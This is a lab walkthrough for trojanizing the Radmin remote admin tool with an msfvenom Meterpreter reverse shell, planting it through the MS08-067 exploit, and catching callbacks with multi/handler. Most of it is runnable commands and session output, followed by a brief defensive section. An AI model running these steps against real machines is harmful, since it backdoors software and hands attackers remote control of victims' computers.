# Trojanized Remote Admin Backdoor with msfvenom and MS08-067

## Malware / Post-Exploitation 

Here we:

* Take a *legitimate* Windows program (`radmin.exe` – a remote admin tool),
* Embed a **Meterpreter reverse shell** inside it using `msfvenom`,
* Upload this trojanized binary to a compromised Windows machine (via MS08-067),
* Set up a listener (`multi/handler`) to catch new sessions whenever the victim runs that program.

Goal is to:
Simulate how an attacker can **weaponize a legitimate binary** and then “build an army” of compromised hosts that call back whenever users execute that binary.

---

## Commands used

Assumptions:

* Attacker (Kali): `192.168.0.1`
* Victim Windows host (vulnerable to MS08-067): `192.168.0.100`
* `radmin.exe` on Kali at: `/usr/share/windows-binaries/radmin.exe`

---

### 1. Generate a trojanized radmin.exe with msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 \
  -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe
```

Understanding this command:

* `msfvenom` – Metasploits standalone payload/binary generator.
* `-p windows/meterpreter/reverse_tcp`
  Use the Windows Meterpreter reverse TCP payload.
* `LHOST=192.168.0.1`
  The IP address the victim will connect back to
* `LPORT=4444`
  The TCP port on Kali (listening).
* `-x /usr/share/windows-binaries/radmin.exe`
  Using **existing EXE** as a template. msfvenom injects the payload into this binary.
* `-k`
  *Keep* the original program’s functionality (so `radmin.exe` still behaves like radmin **and** runs the payload).
* `-f exe`
  Output format: Windows PE executable.
* `> radmin.exe`
  Redirect output into a new file called `radmin.exe`.

Result: You now have a **trojanized remote admin tool**: looks/acts like Radmin, but also triggers a Meterpreter reverse shell when run.

---

### 2. Start Metasploit and exploit MS08-067

```bash
msfconsole -q
```

Select and configure the SMB MS08-067 exploit:

```text
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.0.100
exploit
```

Explanation of command:

* `use exploit/windows/smb/ms08_067_netapi`
  Load the classic MS08-067 NetAPI exploit (RPC vulnerability in Windows).
* `set RHOST 192.168.0.100`
  Target Windows machine.
* `exploit`
  Run with default payload

When/if the exploit is successful, you get a Meterpreter prompt:

```text
meterpreter >
```

---

### 3. Use Meterpreter to upload the trojanized radmin.exe

In the Meterpreter session:

```text
meterpreter > cd /
meterpreter > lls
meterpreter > upload radmin.exe
```

What these do:

* `cd /`
  Change directory on the **remote** system to the root of the drive.
* `lls`
  List **local** files (in Kali directory)
* `upload radmin.exe`
  Uploads the local `radmin.exe` (trojanized file) to the **current remote directory** (`C:\` on Windows in this case).

> At this point, the infected `radmin.exe` is on the victim machine but not yet executed.

Now background the session to set up a dedicated listener:

```text
meterpreter > background
```
---

### 4. Set up a multi/handler to wait for callbacks

Back to Metasploit console:

```text
back
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.0.1
set LPORT 4444
exploit
```

Explanation:

* `back`
  Goes back to main prompt.
* `use multi/handler`
  Load a generic payload handler module (waits for reverse shells).
* `set payload windows/meterpreter/reverse_tcp`
  Match exactly the payload embedded into `radmin.exe`.
* `set LHOST 192.168.0.1`
  Listener IP.
* `set LPORT 4444`
  Listener port, same as in msfvenom.
* `exploit`
  Start the listener

Output will show:

```text
[*] Started reverse TCP handler on 192.168.0.1:4444
```

Now it is just in a waiting stage.

---

### 5. Victim runs radmin.exe -> new Meterpreter session

On the Windows victim:

* Open the folder where `radmin.exe` was uploaded.
* Double-click `radmin.exe` to run it.

From the users perspective:

* Radmin’s normal GUI appears.
* In the background, the embedded payload connects back to Kali machine on `192.168.0.1:4444`.

On Kali, in Metasploit, you will see:

```text
[*] Sending stage (175174 bytes) to 192.168.0.100
[*] Meterpreter session 2 opened (192.168.0.1:4444 -> 192.168.0.100:12345) at ...
```


List sessions:

```text
msf6 exploit(multi/handler) > sessions -l
```

Interact:

```text
msf6 exploit(multi/handler) > sessions -i 2
meterpreter >
```

---

## Analysis / Notes

* This lab shows how an attacker can:

  * Use `msfvenom` to **weaponize a legitimate binary** (trojanization),
  * Deliver it after an initial exploit (MS08-067 here),
  * Then simply wait with `multi/handler` for victims to run the infected file.
* The "army" idea:
  Once such trojanized tools are spread across many machines, the attacker can just keep listeners and **wait for incoming sessions** as users execute the tool over time. Thats how botnets and large-scale remote-control networks can be formed.
* From a **defensive** point of view, this lab shows:

  * Why you should **verify integrity** of tools (hashes, code signing).
  * Why application whitelisting / EDR monitoring of unusual network connections is critical.
  * That "it’s just a legit admin tool" is not a guarantee that it might be repackaged.

